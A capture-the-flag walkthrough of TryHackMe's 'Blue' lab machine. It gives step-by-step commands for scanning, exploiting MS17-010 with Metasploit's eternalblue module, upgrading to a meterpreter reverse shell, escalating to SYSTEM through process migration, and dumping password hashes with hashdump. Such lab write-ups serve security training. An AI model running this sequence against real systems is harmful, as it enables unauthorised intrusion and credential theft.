Hello Everyone!
I’m Collins, a security researcher. This is an article on how to exploit blue a machine on [TryHackMe](https://tryhackme.com/dashboard) made by [DarkStar7471](https://tryhackme.com/p/DarkStar7471).

## DEPLOYING THE MACHINE
To connect to TryHackMe you will need to download the `OpenVpn` and connect to their VPN. Once connected to their VPN start the machine and we are ready to exploit it. Once you have deployed the machine you would be given an IP address and one hour time (but you can add one hour) as shown in the figure bellow.
![starting machine](002.png)_fig 1.0_
## TASK 1: RECON

We shall start our recon by scanning the machine. The command we shall use is `nmap -sV -A <TARGET_IP>`

![nmap](003.png)_fig 2.0_

We can manually count the number of ports under 1000 on our nmap scan which is 3.

To know what is this machine vulnerable to we shall run `nmap <TARGET_IP>-script vuln` and the result should like as figure 3.0

![fig 3](004.jpeg)_fig 3.0_

As we can clearly see the target is vulnerable to ms17–010

## TASK 2: GAINING ACCESS

Now the fun part is here where we shall gain full access to our target.

The first thing to do is to launch `Metasploit`. This is done by writing `msfconsole` to the terminal as in figure 4.0

![fig 4](005.png)_fig 4.0_

Now we shall use the search feature to search for `ms17_010_` which we had earlier found that the target is vulnerable to. The full path of the exploit as found on the search is `exploit/windows/smb/ms17_010_eternalblue` as shown in the figure 5.0

![fig 5](006.png)_fig 5.0_

Use the show options and see what is required.Set `RHOST` to your target IP.(shown in figure 6.0)
![fig 6](007.png)_fig 6.0_

With that done, run the exploit…

![fig 6.1](008.png)_fig 6.1_

We have to background the shell by `CTRL + Z` or by typing `background`.

![fig 6.2](009.png)_fig 6.2_

## TASK 3: ESCALATE

Alright, it’s now time to upgrade our shell to meterpreter. We shall find our upgrade module by searching for `shell_to_meterpreter` as shown in figure 7.1

![fig 7.0](010.png)_fig 7.0_

Select the `post/multi/manage/shell_to_meterpreter` by the use of `use` command as in figure 7.1

![fig 7.1](011.png)_fig 7.1_

Set `LHOST <Your_IP>`

![fig 7.2](012.png)_fig 7.2_

We use `sessions -i` command to see the current session

![fig 7.3](013.png)_fig 7.3_

We shall use the `run` command to get the meterpreter shell.

![fig](014.png)

Once again use the sessions -i command to see the current session and you’ll notice we have meterpreter shell as in figure 7.4

![fig 7.4](015.png)_fig 7.4_

Now we shall use `set SESSION 2` and start interaction with it.

![fig](016.png)_fig 7.5_

Since we have already connected through a meterpreter session to the target machine we can escalate privileges by the using the command getsystem. Use the `shell` command and run `whoami` then background the session.

![fig](017.png)

List all the process by the command `ps` and migrate to a process that is running at NT AUTHORITY\SYSTEM
To migrate we can use `migrate -N (name_of_the_process)` OR `migrate -P (process_ID)`

![fig](018.png)

## TASK 4: CRACKING

With our elevated meterpreter shell, run the command `hashdump` which will dump all of the passwords on the machine as long as we have the correct privileges.

![hashdamp](019.jpeg)

## TASK 5: FINDING FLAGS

**FLAG 1**

Flag one is located on the root of the machine in which is `C:/`

cat flag1.txt

![flag 1](020.png)_flag 1_

**FLAG 2**

We shall search for sam location on windows which is `C:\Windows\System32\config`

cat flag2.txt

![flag 2](021.png)_flag 2_

**FLAG 3**

We shall use the search function to search for flag3
```
search -f flag*.txt
cat c:\\Users\\Jon\\Documents\\flag3.txt
```
